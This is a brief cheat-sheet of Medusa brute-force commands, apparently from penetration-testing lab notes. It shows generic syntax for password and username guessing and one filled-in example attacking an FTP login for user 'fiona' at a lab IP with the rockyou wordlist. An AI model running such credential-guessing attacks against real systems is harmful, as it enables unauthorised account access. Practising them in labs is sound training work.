-- -
```bash
# password bruteforce 
medusa -u <user> -P <wordlist> -h <ip> -M <service>
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp 

# username bruteforce
medusa -U <wordlist -p <password> -h <ip> -M <service>
```